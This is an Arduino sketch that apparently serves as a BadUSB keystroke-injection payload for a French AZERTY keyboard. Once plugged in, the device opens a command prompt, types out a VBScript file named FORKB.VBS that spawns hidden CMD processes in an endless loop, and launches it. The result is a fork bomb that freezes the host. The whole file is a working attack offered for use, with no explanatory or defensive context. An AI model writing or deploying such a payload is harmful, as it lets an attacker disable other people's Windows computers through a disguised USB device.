#include <KeyboardAzertyFr.h>
void setup() {
  KeyboardAzertyFr.begin();
  delay(1000);

  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_ESC);

  KeyboardAzertyFr.releaseAll();
  delay(200);

  print(F("cmd"));
  delay(1000);

  type(KEY_RETURN, false);
  KeyboardAzertyFr.releaseAll();
  delay(600);

  print(F("COPY CON FORKB.VBS"));

  type(KEY_RETURN, false);
  KeyboardAzertyFr.releaseAll();

  print(F("DO"));

  type(KEY_RETURN, false);
  KeyboardAzertyFr.releaseAll();

  print(F("CREATEOBJECT(\"WSCRIPT.SHELL\").RUN \"CMD\", 0, FALSE"));

  type(KEY_RETURN, false);
  KeyboardAzertyFr.releaseAll();

  print(F("LOOP"));

  type(KEY_LEFT_CTRL, false);
  type('Z', false);
  KeyboardAzertyFr.releaseAll();

  type(KEY_RETURN, false);
  KeyboardAzertyFr.releaseAll();
  delay(50);

  print(F("START FORKB.VBS && EXIT"));

  type(KEY_RETURN, false);
  KeyboardAzertyFr.releaseAll();
  KeyboardAzertyFr.end();
}
void type(int key, boolean release) {
  KeyboardAzertyFr.press(key);
  if (release)
    KeyboardAzertyFr.release(key);
}
void print(const __FlashStringHelper *value) {
  KeyboardAzertyFr.print(value);
}
void loop() {}
